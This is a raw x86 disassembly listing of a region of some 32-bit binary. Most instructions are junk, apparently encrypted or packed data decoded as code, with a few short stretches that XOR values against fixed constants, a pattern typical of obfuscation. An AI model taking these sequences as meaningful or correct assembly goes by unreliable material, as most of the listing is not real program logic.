  421559:	adc    dl,BYTE PTR [ecx-0x6e]
  42155c:	out    dx,eax
  42155d:	test   al,0x69
  42155f:	sbb    esp,edi
  421561:	out    dx,al
  421562:	in     eax,dx
  421563:	push   ebx
  421564:	aam    0xa
  421566:	imul   DWORD PTR [ebx+0x4d89b9c6]
  42156c:	leave  
  42156d:	xchg   ebp,eax
  42156e:	pop    DWORD PTR [edi+0x4f]
  421571:	(bad)  
  421572:	mov    esp,0x257058ca
  421577:	in     al,dx
  421578:	ret    
  421579:	sub    eax,0x9a77f0b8
  42157e:	and    eax,0xda79ff45
  421583:	ret    
  421584:	dec    ebp
  421585:	cld    
  421586:	arpl   cx,bp
  421588:	dec    edx
  421589:	pop    ebp
  42158a:	jg     0x421525
  42158c:	inc    esp
  42158d:	inc    esp
  42158e:	sbb    al,0xc9
  421590:	and    BYTE PTR [esi],ah
  421592:	cwde   
  421593:	sahf   
  421594:	sbb    al,0x98
  421596:	stc    
  421597:	mov    ecx,0x6bbbf2ae
  42159c:	xor    dh,dh
  42159e:	sub    al,0xf6
  4215a0:	push   esp
  4215a1:	aas    
  4215a2:	push   esi
  4215a3:	repz cli 
  4215a5:	adc    al,0x3e
  4215a7:	stos   DWORD PTR es:[edi],eax
  4215a8:	js     0x42156a
  4215aa:	adc    edi,edx
  4215ac:	repz xchg ebx,eax
  4215ae:	xor    ebx,DWORD PTR [eax]
  4215b0:	xchg   edi,eax
  4215b1:	cmc    
  4215b2:	ss ftst 
  4215b5:	enter  0xd88e,0x7c
  4215b9:	addr16 pop ebx
  4215bb:	inc    eax
  4215bc:	push   es
  4215bd:	mov    ebp,0x5d2ff220
  4215c2:	push   ss
  4215c3:	jmp    0xfb02ada3
  4215c8:	or     bl,BYTE PTR [edx+0x67]
  4215cb:	inc    esi
  4215cc:	cmp    eax,0xd8ff3ea7
  4215d1:	mov    ds:0x5ee82814,al
  4215d6:	mov    ch,BYTE PTR ds:0xe471ac99
  4215dc:	xor    al,cl
  4215de:	inc    eax
  4215df:	push   esp
  4215e0:	jmp    0x2a57:0xe9f003f8
  4215e7:	stos   BYTE PTR es:[edi],al
  4215e8:	cld    
  4215e9:	dec    eax
  4215ea:	mov    WORD PTR [ebx+0x34],es
  4215ed:	pop    edx
  4215ee:	repz imul edx,DWORD PTR [ecx],0x61760fa
  4215f5:	cmp    eax,0xd4597b
  4215fa:	out    dx,eax
  4215fb:	ret    
  4215fc:	jl     0x42164c
  4215fe:	push   0x4f
  421600:	mov    esi,0xf572c564
  421605:	push   ebx
  421606:	lds    ebp,FWORD PTR [ebx+0x616cb384]
  42160c:	lea    eax,[ebx-0x1e023cb8]
  421612:	stc    
  421613:	inc    ecx
  421614:	jne    0x4215db
  421616:	pop    ebx
  421617:	loopne 0x421661
  421619:	inc    edx
  42161a:	pop    edx
  42161b:	sbb    al,BYTE PTR [esi]
  42161d:	out    0x41,al
  42161f:	popa   
  421620:	mov    eax,0x4443ea85
  421625:	add    cl,BYTE PTR [ebp+ebx*2-0x34]
  421629:	sbb    edx,edx
  42162b:	mov    ah,0x38
  42162d:	mov    ?,edi
  42162f:	bound  eax,QWORD PTR [eax-0x70]
  421632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421633:	lods   al,BYTE PTR ds:[esi]
  421634:	lock mov ah,0x92
  421637:	push   esi
  421638:	sbb    edi,edi
  42163a:	mov    bh,0x65
  42163c:	jmp    0x8542:0xb270b7e1
  421643:	mov    ah,0xe3
  421645:	enter  0x7599,0xe5
  421649:	push   ebp
  42164a:	add    edx,DWORD PTR [ebx+0x3f6cbfbe]
  421650:	int3   
  421651:	nop    DWORD PTR [esi]
  421654:	mov    DWORD PTR [ecx-0x55],0xf62567f8
  42165b:	lods   al,BYTE PTR ds:[esi]
  42165c:	sbb    eax,0x2e0785cd
  421661:	into   
  421662:	and    al,0xad
  421664:	(bad)  
  421665:	xor    DWORD PTR [edi],ebp
  421667:	push   edi
  421668:	xchg   esp,eax
  421669:	arpl   WORD PTR [esi+ecx*8+0x69],dx
  42166d:	xor    ebp,eax
  42166f:	cli    
  421670:	shr    DWORD PTR [eax+0x72d53cde],1
  421676:	xchg   BYTE PTR [ebx],bl
  421678:	mov    ds:0x88d22e3d,al
  42167d:	mov    ds:0x9c6b8835,al
  421682:	cmp    al,0x98
  421684:	in     eax,dx
  421685:	jecxz  0x421647
  421687:	mov    ah,0xe
  421689:	lds    esi,FWORD PTR [edi+0x51b10a5d]
  42168f:	retf   
  421690:	loop   0x4216e8
  421692:	cld    
  421693:	cmp    BYTE PTR [ebx-0x4d],ch
  421696:	daa    
  421697:	stos   BYTE PTR es:[edi],al
  421698:	lds    ecx,FWORD PTR [edx-0x21]
  42169b:	stos   BYTE PTR es:[edi],al
  42169c:	mov    edi,0x9cb5f2b5
  4216a1:	fisubr WORD PTR [ebp+edi*2-0x630992c1]
  4216a8:	in     al,dx
  4216a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216aa:	adc    al,0x22
  4216ac:	mov    bl,0xf
  4216ae:	sub    BYTE PTR [eax+0x34c682db],al
  4216b4:	add    eax,0xa42c4a66
  4216b9:	inc    ecx
  4216ba:	sbb    DWORD PTR [ebx-0x3338549b],ebp
  4216c0:	aas    
  4216c1:	scas   eax,DWORD PTR es:[edi]
  4216c2:	push   edi
  4216c3:	ret    0x6d0d
  4216c6:	sahf   
  4216c7:	call   0xc149:0x540a297a
  4216ce:	imul   ecx,DWORD PTR [ebp-0x6b],0x37f6a7f
  4216d5:	dec    esi
  4216d6:	push   esi
  4216d7:	pop    edx
  4216d8:	stos   BYTE PTR es:[edi],al
  4216d9:	add    eax,0xea6c905e
  4216de:	add    al,0x8b
  4216e0:	sbb    DWORD PTR [edi],0xd
  4216e3:	bound  esp,QWORD PTR [edx+0x26]
  4216e6:	loopne 0x42168d
  4216e8:	jmp    0xe4b1:0x4827d0fb
  4216ef:	add    edx,ebp
  4216f1:	lahf   
  4216f2:	popf   
  4216f3:	cli    
  4216f4:	(bad)  
  4216f6:	or     DWORD PTR [ecx],esp
  4216f8:	sti    
  4216f9:	(bad)  
  4216fa:	xor    DWORD PTR [esi+0x66b7dd93],ecx
  421700:	bound  ebx,QWORD PTR [ecx+0x522c4bc9]
  421706:	shr    ah,1
  421708:	adc    al,0x20
  42170a:	xor    BYTE PTR [ebp+0x65],dl
  42170d:	push   esp
  42170e:	push   ss
  42170f:	aas    
  421710:	retf   
  421711:	and    al,0x1e
  421713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421714:	jp     0x4216bc
  421716:	xor    BYTE PTR [edi],0xcb
  421719:	ss stc 
  42171b:	sbb    al,0x24
  42171d:	sbb    ch,ah
  42171f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421720:	fwait
  421721:	inc    esp
  421722:	cs jne 0x421727
  421725:	cmp    eax,edx
  421727:	sbb    bl,BYTE PTR [edx]
  421729:	fsubr  st(5),st
  42172b:	mul    BYTE PTR [esi]
  42172d:	repnz sub BYTE PTR [ebx],ch
  421730:	test   DWORD PTR [edx-0x24],0x5b896db6
  421737:	psubd  mm0,QWORD PTR [esi]
  42173a:	pop    eax
  42173b:	xor    DWORD PTR [esi+0x9],edi
  42173e:	fnstsw WORD PTR [ecx]
  421740:	neg    edi
  421742:	(bad)  
  421743:	out    dx,eax
  421744:	pop    es
  421745:	or     al,0xc2
  421747:	push   edx
  421748:	pop    ebx
  421749:	sub    BYTE PTR [ecx],bl
  42174b:	xchg   esi,eax
  42174c:	or     BYTE PTR [ecx+0x4e491df8],al
  421752:	lods   eax,DWORD PTR ds:[esi]
  421753:	and    esi,0x58
  421756:	ffree  st(7)
  421758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421759:	pop    ebp
  42175a:	xchg   DWORD PTR [eax],ebp
  42175c:	push   ecx
  42175d:	dec    ecx
  42175e:	mov    ch,0xd
  421760:	xor    al,0xf3
  421762:	(bad)  
  421763:	ins    BYTE PTR es:[edi],dx
  421764:	in     eax,dx
  421765:	mov    bh,0xf0
  421767:	(bad)  
  421769:	pop    es
  42176a:	sub    al,0x8c
  42176c:	je     0x42171a
  42176e:	pop    esi
  42176f:	iret   
  421770:	inc    edi
  421771:	mov    al,0xa2
  421773:	sub    BYTE PTR [esi-0x36bc4984],ah
  421779:	push   esi
  42177a:	mov    DWORD PTR [ecx*8+0x51d432ca],esp
  421781:	ins    BYTE PTR es:[edi],dx
  421782:	fdivr  QWORD PTR [ecx+ebp*1+0x5b]
  421786:	int3   
  421787:	ret    
  421788:	adc    eax,0x37229079
  42178d:	mov    cl,BYTE PTR [edi-0x64]
  421790:	stc    
  421791:	imul   esp,DWORD PTR [ecx],0x5c
  421794:	inc    edx
  421795:	ins    BYTE PTR es:[edi],dx
  421796:	xor    ah,BYTE PTR [esi+0x3c]
  421799:	in     eax,dx
  42179a:	es mov edi,0x4145546e
  4217a0:	icebp  
  4217a1:	cmp    ebx,DWORD PTR [ebx]
  4217a3:	pushf  
  4217a4:	out    dx,eax
  4217a5:	fwait
  4217a6:	jae    0x4217c5
  4217a8:	mov    eax,0x97d85faa
  4217ad:	loop   0x4217e8
  4217af:	xor    dh,BYTE PTR [ebx+0x680c4c8b]
  4217b5:	popf   
  4217b6:	xchg   ebx,eax
  4217b7:	xchg   edx,eax
  4217b8:	mov    WORD PTR [esi-0x14],fs
  4217bb:	stos   DWORD PTR es:[edi],eax
  4217bc:	call   0x833e:0xa1715f74
  4217c3:	push   es
  4217c4:	in     al,dx
  4217c5:	or     edx,eax
  4217c7:	ret    0x799f
  4217ca:	stos   BYTE PTR es:[edi],al
  4217cb:	mov    bl,0x9
  4217cd:	jne    0x4217b0
  4217cf:	mov    BYTE PTR [eax-0x317931cb],ch
  4217d5:	inc    eax
  4217d6:	js     0x4217d1
  4217d8:	ja     0x42182d
  4217da:	push   ds
  4217db:	test   BYTE PTR [edx],dh
  4217dd:	and    esp,edx
  4217df:	adc    esi,DWORD PTR [edx+edi*4-0x1af61b26]
  4217e6:	inc    ebp
  4217e7:	(bad)  
  4217e8:	mov    BYTE PTR [ecx+eax*1],dh
  4217eb:	cli    
  4217ec:	js     0x421784
  4217ee:	icebp  
  4217ef:	push   ds
  4217f0:	xor    eax,0xfcbb67d0
  4217f5:	mov    BYTE PTR [eax+0x57e7ddd4],dh
  4217fb:	repnz push 0x61
  4217fe:	cmp    eax,0x2ad1f560
  421803:	and    ecx,eax
  421805:	out    0x68,al
  421807:	xchg   esp,eax
  421808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421809:	mov    WORD PTR [ebx-0x68082386],ss
  42180f:	popa   
  421810:	fistp  WORD PTR [edx-0x3d4fe29e]
  421816:	lods   al,BYTE PTR ds:[esi]
  421817:	inc    ecx
  421818:	mov    ebx,0xaf56ccd1
  42181d:	xor    ch,BYTE PTR [edx]
  42181f:	jae    0x421836
  421821:	inc    eax
  421822:	not    DWORD PTR [edi+edx*8-0x5c]
  421826:	inc    edx
  421827:	pusha  
  421828:	mov    cs:0x85495a3d,al
  42182e:	mov    edi,eax
  421830:	shl    ebx,0xe9
  421833:	sub    ecx,edx
  421835:	ds cwde 
  421837:	pop    ss
  421838:	clc    
  421839:	pop    edi
  42183a:	jmp    0x42181f
  42183c:	hlt    
  42183d:	pop    es
  42183e:	shr    ebx,cl
  421840:	ror    DWORD PTR [eax-0x4b895314],1
  421846:	jg     0x421887
  421848:	sbb    bl,bl
  42184a:	retf   
  42184b:	cmc    
  42184c:	xchg   ebx,eax
  42184d:	js     0x421876
  42184f:	stc    
  421850:	push   esp
  421851:	adc    BYTE PTR [ebx-0x1eb6b],cl
  421857:	push   DWORD PTR ds:0xcb79b576
  42185d:	xor    edx,0x9c2b8ae8
  421863:	mov    cl,0x3e
  421865:	call   0x4223ad
  42186a:	or     esi,eax
  42186c:	or     edi,edx
  42186e:	mov    DWORD PTR [ebp-0x1f8],esi
  421874:	jmp    0x421cb0
  421879:	mov    eax,DWORD PTR [ebp-0x1e0]
  42187f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421885:	xor    eax,0xcb79b576
  42188a:	xor    edx,0x9c2b8ae8
  421890:	mov    cl,0x2
  421892:	call   0x408bb8
  421897:	mov    esi,eax
  421899:	mov    edi,edx
  42189b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218a7:	xor    eax,0xcb79b576
  4218ac:	xor    edx,0x9c2b8ae8
  4218b2:	mov    cl,0x3e
  4218b4:	call   0x4223ad
  4218b9:	or     esi,eax
  4218bb:	or     edi,edx
  4218bd:	jmp    0x421ca4
  4218c2:	sbb    bh,BYTE PTR [esi]
  4218c4:	shr    DWORD PTR [edx+0x6ebaba9a],1
  4218ca:	daa    
  4218cb:	xchg   DWORD PTR [eax-0x2f],ebp
  4218ce:	pusha  
  4218cf:	cs ror edi,0xac
  4218d3:	rol    eax,0xbe
  4218d6:	dec    edx
  4218d7:	les    edi,FWORD PTR [esi-0x294a7142]
  4218dd:	ret    
  4218de:	mov    ?,WORD PTR [ecx+0x10]
  4218e1:	jg     0x4218d5
  4218e3:	sub    DWORD PTR [eax+0x76],ebx
  4218e6:	xchg   ebx,eax
  4218e7:	push   ebx
  4218e8:	and    bh,BYTE PTR [eax]
  4218ea:	call   0xc38fc13e
  4218ef:	cli    
  4218f0:	adc    eax,0x30f7512f
  4218f5:	sti    
  4218f6:	popf   
  4218f7:	test   eax,0x465ab60a
  4218fc:	shl    BYTE PTR [edi],cl
  4218fe:	xor    cl,BYTE PTR [edx]
  421900:	sar    DWORD PTR [edi],1
  421902:	sbb    eax,DWORD PTR [eax+0x7d5bc1a3]
  421908:	scas   al,BYTE PTR es:[edi]
  421909:	(bad)  
  42190a:	adc    eax,0x418cfa25
  42190f:	lahf   
  421910:	jbe    0x4218cb
  421912:	sub    al,0xc2
  421914:	sahf   
  421915:	jg     0x421964
  421917:	and    BYTE PTR [edx+0x7a33a46d],0xa3
  42191e:	stos   DWORD PTR es:[edi],eax
  42191f:	push   ebp
  421920:	call   0xfbff2848
  421925:	mov    ah,bh
  421927:	cmp    edx,DWORD PTR fs:[ebx+0x1bca32a1]
  42192e:	add    edi,DWORD PTR [esi-0x17]
  421931:	cld    
  421932:	dec    esi
  421933:	pop    ecx
  421934:	and    eax,0xfd72fe6
  421939:	or     al,0x2c
  42193b:	jmp    0x6a010b
  421940:	xchg   esp,eax
  421941:	pop    ebx
  421942:	test   BYTE PTR [edi+esi*2+0x49],ch
  421946:	jmp    0xedd1:0xfca4bde4
  42194d:	not    BYTE PTR [ecx-0x5]
  421950:	aas    
  421951:	arpl   WORD PTR [eax-0x34],di
  421954:	fdiv   QWORD PTR [ecx-0x72]
  421957:	sbb    esp,DWORD PTR [ecx+eiz*8+0x346adc67]
  42195e:	fincstp 
  421960:	cld    
  421961:	les    edx,FWORD PTR [esi+0x366275a5]
  421967:	jo     0x42191b
  421969:	mov    ebx,0xc2c57d29
  42196e:	lea    ebx,[edi-0x5b1f6cca]
  421974:	xchg   edi,eax
  421975:	mov    ecx,0x618c3881
  42197a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42197b:	pop    ss
  42197c:	enter  0x6fb4,0x2a
  421980:	mov    dl,0xf4
  421982:	cmp    DWORD PTR [esi],edi
  421984:	in     eax,dx
  421985:	out    0x66,al
  421987:	loop   0x4219b3
  421989:	xchg   edx,eax
  42198a:	popa   
  42198b:	pop    esp
  42198c:	pop    edi
  42198d:	mov    al,0xc2
  42198f:	mov    dh,0xa9
  421991:	sub    eax,0x1dd6470a
  421996:	xchg   ecx,eax
  421997:	xlat   BYTE PTR ds:[ebx]
  421998:	fmul   QWORD PTR [eax+0x54]
  42199b:	shl    dl,1
  42199d:	or     cl,BYTE PTR [esi+0x6]
  4219a0:	and    BYTE PTR [ecx+0x79],al
  4219a3:	mov    ebx,0x12ccfa62
  4219a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219a9:	and    eax,0x40097dea
  4219ae:	dec    esi
  4219af:	bound  ebx,QWORD PTR [eax-0x68dbc3b3]
  4219b5:	jg     0x4219d2
  4219b7:	sub    al,0x2e
  4219b9:	adc    eax,0x1973e9e7
  4219be:	in     eax,dx
  4219bf:	xchg   bh,dh
  4219c1:	dec    ebx
  4219c2:	xchg   ebp,esp
  4219c4:	cmp    eax,0x816c4f68
  4219c9:	fidivr DWORD PTR [esi-0x52]
  4219cc:	push   0x7a
  4219ce:	popa   
  4219cf:	test   edx,ecx
  4219d1:	ins    BYTE PTR es:[edi],dx
  4219d2:	out    dx,al
  4219d3:	push   esi
  4219d4:	push   0xffffffbc
  4219d6:	push   edi
  4219d7:	jp     0x421a56
  4219d9:	mov    ebp,0xfbb26b49
  4219de:	fld    DWORD PTR [ebx-0x35d3b557]
  4219e4:	add    BYTE PTR [ecx-0x5e58a5a4],cl
  4219ea:	or     eax,0x3d3064c7
  4219ef:	mov    ecx,0xbec0f476
  4219f4:	xchg   esp,eax
  4219f5:	sbb    bh,BYTE PTR [edi]
  4219f7:	dec    esp
  4219f8:	pop    ecx
  4219f9:	jmp    0x5712:0x4a8e2101
  421a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a01:	or     ebp,DWORD PTR [ebp+0x17]
  421a04:	sbb    eax,0x89544c9b
  421a09:	nop
  421a0a:	pop    ds
  421a0b:	in     al,0x22
  421a0d:	mov    esp,0x30a586ae
  421a12:	shl    DWORD PTR [ebp+0x52],cl
  421a15:	push   edx
  421a16:	adc    al,0x7b
  421a18:	popf   
  421a19:	inc    edx
  421a1a:	sahf   
  421a1b:	sub    al,0xe7
  421a1d:	pop    es
  421a1e:	mov    al,0xe5
  421a20:	dec    esi
  421a21:	es push es
  421a23:	retf   0x4528
  421a26:	retf   
  421a27:	test   al,0x5b
  421a29:	sar    DWORD PTR [ecx-0x4b3325b],cl
  421a2f:	jge    0x4219ce
  421a31:	aaa    
  421a32:	and    dh,BYTE PTR [ebx+0x339bdb0e]
  421a38:	sub    BYTE PTR [edx-0x75db4a59],dl
  421a3e:	dec    edi
  421a3f:	add    al,0x25
  421a41:	add    edi,0xffffffd9
  421a44:	lods   eax,DWORD PTR ds:[esi]
  421a45:	mov    ebp,DWORD PTR [ebp+0x36c570f6]
  421a4b:	or     esp,DWORD PTR [eax]
  421a4d:	adc    ecx,esi
  421a4f:	dec    esp
  421a50:	push   0x7f
  421a52:	sahf   
  421a53:	in     eax,dx
  421a54:	test   BYTE PTR [esp+ecx*2],ch
  421a57:	hlt    
  421a58:	or     DWORD PTR [ebp+0x49],ebx
  421a5b:	pop    eax
  421a5c:	sbb    esp,edi
  421a5e:	nop    DWORD PTR [ebx+0x4d]
  421a62:	(bad)  
  421a63:	dec    ecx
  421a64:	loop   0x421aa8
  421a66:	sub    al,0xdd
  421a68:	dec    ebx
  421a69:	sbb    al,BYTE PTR [edi]
  421a6b:	jbe    0x4219f9
  421a6d:	repnz (bad) 
  421a6f:	mov    edi,0x37c7d018
  421a74:	mov    cl,0x18
  421a76:	imul   BYTE PTR [eax]
  421a78:	mov    esi,0x1a64520f
  421a7d:	(bad)  
  421a7e:	jmp    0x421a1e
  421a80:	sub    dl,BYTE PTR ds:0x3d85eddd
  421a86:	popa   
  421a87:	js     0x421a58
  421a89:	push   ebx
  421a8a:	dec    edx
  421a8b:	cli    
  421a8c:	inc    eax
  421a8d:	jecxz  0x421afa
  421a8f:	mov    ds:0xdd9d144b,al
  421a94:	push   ecx
  421a95:	test   al,0xa
  421a97:	mov    ebp,ebx
  421a99:	jno    0x421a23
  421a9b:	dec    ecx
  421a9c:	outs   dx,DWORD PTR ds:[esi]
  421a9d:	out    0x1c,eax
  421a9f:	pop    es
  421aa0:	or     ebp,DWORD PTR [edx-0x4ac3eaff]
  421aa6:	ss es adc al,0xc1
  421aaa:	ds jne 0x421ab1
  421aad:	(bad)  
  421aae:	adc    eax,0xedbfe67b
  421ab3:	dec    esp
  421ab4:	sbb    DWORD PTR [ebx-0x7ba2879c],edx
  421aba:	icebp  
  421abb:	jle    0x421b2e
  421abd:	mov    ebp,0xa40f0c57
  421ac2:	add    ch,BYTE PTR [edx]
  421ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ac5:	mov    esi,DWORD PTR [eax]
  421ac7:	out    0xc7,al
  421ac9:	fld    QWORD PTR [eax-0x1e]
  421acc:	inc    esi
  421acd:	pop    ss
  421ace:	cli    
  421acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ad0:	sub    DWORD PTR [edx],eax
  421ad2:	sbb    al,0x39
  421ad4:	push   eax
  421ad5:	lea    esp,[eax]
  421ad7:	cmc    
  421ad8:	mov    ecx,0x39bed4af
  421add:	inc    eax
  421ade:	add    eax,0x4f2ed50c
  421ae3:	sbb    BYTE PTR [edx],al
  421ae5:	cwde   
  421ae6:	daa    
  421ae7:	dec    ecx
  421ae8:	mov    ebp,DWORD PTR [ebx-0x122bec9d]
  421aee:	mov    cl,0x5c
  421af0:	mov    ds:0x1cc9c697,eax
  421af5:	scas   al,BYTE PTR es:[edi]
  421af6:	vpmullw xmm5{k4},xmm2,XMMWORD PTR [edx]
  421afc:	imul   edx,DWORD PTR [edx+0x40c0502a],0x304e98cf
  421b06:	dec    eax
  421b07:	mov    cl,0x71
  421b09:	jbe    0x421b49
  421b0b:	test   eax,0x669aa61d
  421b10:	ret    
  421b11:	jo     0x421ac3
  421b13:	daa    
  421b14:	mov    ah,0x38
  421b16:	rcl    BYTE PTR [edx],1
  421b18:	mov    cs,WORD PTR [ecx]
  421b1a:	mov    eax,ds:0x1841f6d9
  421b1f:	or     BYTE PTR [eax-0x58],dl
  421b22:	js     0x421af9
  421b24:	mov    BYTE PTR [ebx+edi*4-0x35],0x56
  421b29:	pop    es
  421b2a:	and    BYTE PTR ds:0xdf56e19d,ah
  421b30:	inc    edx
  421b31:	xchg   esp,eax
  421b32:	test   BYTE PTR [ebp-0x3a2b0b63],bh
  421b38:	add    edi,ecx
  421b3a:	xor    eax,0xfa46f28d
  421b3f:	ja     0x421b0c
  421b41:	out    dx,eax
  421b42:	jns    0x421ba8
  421b44:	out    dx,al
  421b45:	push   0x6f6aaf15
  421b4a:	inc    esp
  421b4b:	xor    BYTE PTR [ecx],dh
  421b4d:	xchg   edx,eax
  421b4e:	repz ds cwde 
  421b51:	push   edi
  421b52:	mul    BYTE PTR gs:[ecx]
  421b55:	(bad)  
  421b56:	popf   
  421b57:	jns    0x421b53
  421b59:	scas   al,BYTE PTR es:[edi]
  421b5a:	lods   al,BYTE PTR ds:[esi]
  421b5b:	ss jecxz 0x421b5c
  421b5e:	and    dl,0xa8
  421b61:	shl    DWORD PTR [ebp+0x17],0x9d
  421b65:	add    DWORD PTR [edx+edi*8-0x2d6812d],0x79743a79
  421b70:	push   cs
  421b71:	or     eax,0x995193e9
  421b76:	retf   
  421b77:	add    dh,ch
  421b79:	mov    dl,0xe1
  421b7b:	lods   eax,DWORD PTR ds:[esi]
  421b7c:	scas   al,BYTE PTR es:[edi]
  421b7d:	sahf   
  421b7e:	call   0x94803646
  421b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b84:	imul   ecx,ebp,0xfffffffa
  421b87:	das    
  421b88:	call   0xbd55:0xc1d10f53
  421b8f:	fcom   st(2)
  421b91:	fist   WORD PTR [ecx]
  421b93:	mov    ?,WORD PTR [edx+esi*4-0x1a4d80ed]
  421b9a:	ret    
  421b9b:	cdq    
  421b9c:	in     al,dx
  421b9d:	inc    edx
  421b9f:	mov    ch,0x69
  421ba1:	into   
  421ba2:	or     al,0x5e
  421ba4:	loop   0x421b45
  421ba6:	cs scas eax,DWORD PTR es:[edi]
  421ba8:	push   ecx
  421ba9:	mov    esi,0xc9952703
  421bae:	adc    BYTE PTR [ebp+0x11],bl
  421bb1:	ja     0x421c12
  421bb3:	sbb    dh,BYTE PTR [edx-0x4c]
  421bb6:	enter  0x4ecf,0x87
  421bba:	imul   BYTE PTR [eax+0x20cd7294]
  421bc0:	adc    BYTE PTR [edx+eax*1],0xfa
  421bc4:	fisttp WORD PTR [edx*8+0x5aded7ae]
  421bcb:	mov    esi,0xbc28298d
  421bd0:	scas   al,BYTE PTR es:[edi]
  421bd1:	fld    TBYTE PTR [edx-0x199339ef]
  421bd7:	jge    0x421b6e
  421bd9:	add    ecx,DWORD PTR [edx]
  421bdb:	cmp    eax,0x9aa493f8
  421be0:	(bad)  
  421be2:	xchg   DWORD PTR [esi-0x11380dbd],edx
  421be8:	ins    DWORD PTR es:[edi],dx
  421be9:	rcl    DWORD PTR [ebx+0x78784834],1
  421bef:	sub    BYTE PTR [eax-0x3734ba8e],dl
  421bf5:	jl     0x421c71
  421bf7:	xlat   BYTE PTR ds:[ebx]
  421bf8:	dec    edx
  421bf9:	sub    ch,0x39
  421bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bfd:	daa    
  421bfe:	shl    BYTE PTR [ebp-0x4f91736b],cl
  421c04:	(bad)  
  421c06:	xor    esi,edi
  421c08:	push   0xffffff9c
  421c0a:	pop    es
  421c0b:	out    dx,eax
  421c0c:	or     BYTE PTR [ecx],dh
  421c0e:	jl     0x421c1f
  421c10:	test   BYTE PTR [edi],ch
  421c12:	jp     0x421c7b
  421c14:	sbb    BYTE PTR [esi-0x71],0xa1
  421c18:	cs aas 
  421c1a:	mov    ah,0xbb
  421c1c:	push   ebp
  421c1d:	push   0xf40b3e2d
  421c22:	jae    0x421c91
  421c24:	jns    0x421c6f
  421c26:	xlat   BYTE PTR ds:[ebx]
  421c27:	in     al,0xea
  421c29:	rcr    DWORD PTR [eax+0x51],cl
  421c2c:	outs   dx,DWORD PTR ds:[esi]
  421c2d:	fmul   QWORD PTR [ebx]
  421c2f:	pop    ebx
  421c30:	rcr    BYTE PTR [ebp+0x26],1
  421c33:	cmp    eax,0xbed42425
  421c38:	mov    DWORD PTR [edi-0x108377a7],edx
  421c3e:	pop    esp
  421c3f:	mov    ah,0xe6
  421c41:	ds jecxz 0x421c6b
  421c44:	jmp    0x421ca2
  421c46:	test   BYTE PTR [eax],cl
  421c48:	daa    
  421c49:	push   ebx
  421c4a:	sbb    al,0x2e
  421c4c:	and    edi,esp
  421c4e:	dec    edi
  421c4f:	not    DWORD PTR [esi]
  421c51:	cmp    BYTE PTR [esi-0x1db9a903],al
  421c57:	and    eax,0xd5eda3fd
  421c5c:	lods   al,BYTE PTR ds:[esi]
  421c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c5e:	mov    ds:0x11c9073,al
  421c63:	stc    
  421c64:	cmp    eax,ebp
  421c66:	dec    edx
  421c67:	push   eax
  421c68:	mov    ah,0xe2
  421c6a:	icebp  
  421c6b:	nop
  421c6c:	ret    
  421c6d:	test   DWORD PTR [edx],0x6af9b156
  421c73:	adc    al,0x46
  421c75:	hlt    
  421c76:	push   edi
  421c77:	imul   ebp,DWORD PTR ds:0xc8c699c4,0x55
  421c7e:	jo     0x421c16
  421c80:	call   0x88688a61
  421c85:	daa    
  421c86:	stos   BYTE PTR es:[edi],al
  421c87:	xchg   BYTE PTR [ebx-0x1c],cl
  421c8a:	ret    
  421c8b:	pop    ds
  421c8c:	fcmovnbe st,st(0)
  421c8e:	or     edi,DWORD PTR [edx]
  421c90:	sti    
  421c91:	or     bh,bh
  421c93:	pop    ds
  421c94:	jbe    0x421d0d
  421c96:	xchg   edi,eax
  421c97:	iret   
  421c98:	(bad)  
  421c99:	shr    BYTE PTR [ecx-0x1e],1
  421c9c:	push   es
  421c9d:	shl    DWORD PTR [esi-0x5d8d72b8],1
  421ca3:	rol    DWORD PTR [ebx],0xb5
  421ca6:	or     dh,bh
  421ca8:	(bad)  
  421ca9:	dec    DWORD PTR [ecx-0x1f74b]
  421caf:	dec    DWORD PTR [ebx-0x1e77b]
  421cb5:	(bad)  
  421cb6:	cmp    DWORD PTR [ebp-0x1f8],eax
  421cbc:	je     0x421dde
  421cc2:	mov    eax,DWORD PTR [ebp-0x1f8]
  421cc8:	mov    ecx,DWORD PTR [ebp-0x20c]
  421cce:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421cd3:	xor    eax,0xa59b
  421cd8:	movzx  eax,ax
  421cdb:	sar    eax,1
  421cdd:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ce3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ce9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421cee:	xor    ecx,0xa59b
  421cf4:	movzx  ecx,cx
  421cf7:	shl    ecx,0xf
  421cfa:	or     eax,ecx
  421cfc:	movzx  eax,ax
  421cff:	mov    DWORD PTR [ebp-0x1fc],eax
  421d05:	jmp    0x421d94
  421d0a:	jg     0x421cee
  421d0c:	sbb    BYTE PTR [edx-0x144c4344],ch
  421d12:	outs   dx,BYTE PTR ds:[esi]
  421d13:	mov    esp,0x473990cd
  421d18:	sub    cl,dl
  421d1a:	cmp    cl,cl
  421d1c:	sar    BYTE PTR [esi-0x41414167],0x65
  421d23:	shl    DWORD PTR [ebx+ebx*8-0x15],cl
  421d27:	fisubr WORD PTR [ebx-0x59]
  421d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d2b:	xor    DWORD PTR [ebp-0x79def4dc],ecx
  421d31:	dec    ebx
  421d32:	jbe    0x421cbb
  421d34:	mov    ebx,DWORD PTR [edx+0x41027375]
  421d3a:	jmp    0x7e8aa9d
  421d3f:	pop    esi
  421d40:	or     BYTE PTR [ebp+0x2a6a75e4],bl
  421d46:	cmp    BYTE PTR [ebx],al
